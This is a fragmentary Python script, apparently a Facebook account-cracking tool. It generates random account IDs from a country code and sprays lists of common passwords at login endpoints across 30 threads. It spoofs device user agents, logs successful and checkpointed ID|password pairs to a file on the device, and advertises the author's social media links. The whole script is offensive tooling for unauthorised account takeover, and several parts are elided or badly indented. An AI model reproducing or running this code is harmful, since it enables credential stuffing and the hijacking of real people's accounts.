...
print('[•] Join my fecebook')
os.system('xdg-open https://facebook.com/505877778/')
...
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U;Redmi9t'
...
for agent in range(10000):
	aa='Mozilla/5.0 (Redmi9t; Redmo9t 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
...
try:
        ...
        fbcr = "Zong"
device = {
        'Redmi9t_version':Redmi9t_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
...
def menu():
		...
		#	os.system('xdg-open https://www.facebook.com/Mustacsim2006')
			if xd in ['1','01']:
				...
				os.system('xdg-open https://chat.whatsapp.com/+252611522943')
				menu()
			elif xd in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
...
def pak():
		user=[]
		clear()
		print('\033[1;35m Code example: 756,740,704,785')
		...
		with tred(max_workers=30) as TRT:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'khankhan','khan1122','ali12345','khanbaba','uganda','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
				if pcs in ['2','02']:
					passlist = [psx,ids,'khankhan','khan1122','ali12345','uganda','khan12345','ali1122','baloch12345','khan','baloch','khan','pubg','pubg1122','malik786']
				elif pcs in ['3','03']:
					...
					passlist = [psx,ids,'somalia','uganda','i love you','iloveyou','free fire','freefire']
				elif pcs in ['8','08']:
					passlist = [psx,ids,'hooyo123','Aabo12345','hooyomcn123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
				if mthd in ['1','20']:
					DJ.submit(trt1,ids,passlist)
				if mthd in ['2','21']:
					DJ.submit(trt2,ids,passlist)
				if mthd in ['3','022']:
					DJ.submit(trt3,ids,passlist)
				if mthd in ['4','23']:
					DJ.submit(trt4,ids,passlist)
				if mthd in ['5','24']:
					DJ.submit(trt5,ids,passlist)
				if mthd in ['6','25']:
					DJ.submit(trt6,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [DJ-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[DJ-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [DJ-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [DJ-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [DJ-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [DJ-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/DJ-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [DJ-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [DJ-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
